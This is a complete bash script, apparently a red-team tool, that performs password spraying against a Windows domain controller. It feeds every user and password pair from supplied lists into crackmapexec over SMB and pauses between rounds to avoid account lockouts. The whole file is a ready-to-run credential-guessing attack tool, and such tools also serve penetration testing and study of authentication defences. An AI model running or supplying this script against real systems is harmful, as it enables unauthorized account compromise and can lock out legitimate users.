#!/usr/bin/env bash
# 2021 Douglas Berdeaux @RackünSec
#
# Recursive CME spraying: per user each password.
# Creates log file.
#
# usage: ./cme-sprayer.sh <passwd file> <user file> <IP of DC> <interval to rest in seconds>
printf "\n\e[93m ░█▀▀█ ░█▀▄▀█ ░█▀▀▀ ── ░█▀▀▀█ ░█▀▀█ ░█▀▀█ ─█▀▀█ ░█──░█ ░█▀▀▀ ░█▀▀█ \n"
printf " ░█─── ░█░█░█ ░█▀▀▀ ▀▀ ─▀▀▀▄▄ ░█▄▄█ ░█▄▄▀ ░█▄▄█ ░█▄▄▄█ ░█▀▀▀ ░█▄▄▀\n"
printf " ░█▄▄█ ░█──░█ ░█▄▄▄ ── ░█▄▄▄█ ░█─── ░█─░█ ░█─░█ ──░█── ░█▄▄▄ ░█─░█\e[39m\n\n"
function usage {
  printf "[!] Usage: \e[1m\e[93m./cme-sprayer.sh\e[39m (passwd file) (user file) (IP of DC) (interval to rest in seconds)\n\n"
  exit 1
}
if [ "$#" -ne 4 ]
  then
    usage
fi
dc_ip=$3
passwd_file=$1
user_file=$2
interval=$4
printf "[i] Spraying DC: \e[1m\e[93m$dc_ip\e[39m\n"
printf "[i] Password list:\e[1m \e[93m$passwd_file\e[39m\n"
printf "[i] Username list: \e[1m\e[93m$user_file\e[39m\n"
printf "[i] Rest interval:\e[1m \e[93m$interval\e[39m seconds\n"
logfile="cme-sprayer-${dc_ip}_int_${interval}_$(date '+%s').txt"
printf "[i] Log file: \e[1m\e[93m${logfile}\e[39m\n\n"
printf "[?] Continue? (CTRL+C to quit at anytime) (y/n)? "
read ans
trap ctrl_c INT
function ctrl_c() {
  exit 1
}
if [[ "$ans" == "y" ]]
then
  for passwd in $(cat $passwd_file | tr -d '\r') # destroy new lines
    do
      for user in $(cat $user_file | tr -d '\r')
        do
          #printf "[i] CME: ($user):($passwd)\n" # DEBUG
          crackmapexec smb $dc_ip -u $user -p "$passwd"
        done; sleep $4
    echo "[log] Full user list $user_file tested with $passwd => Complete." >> $logfile
    done
fi
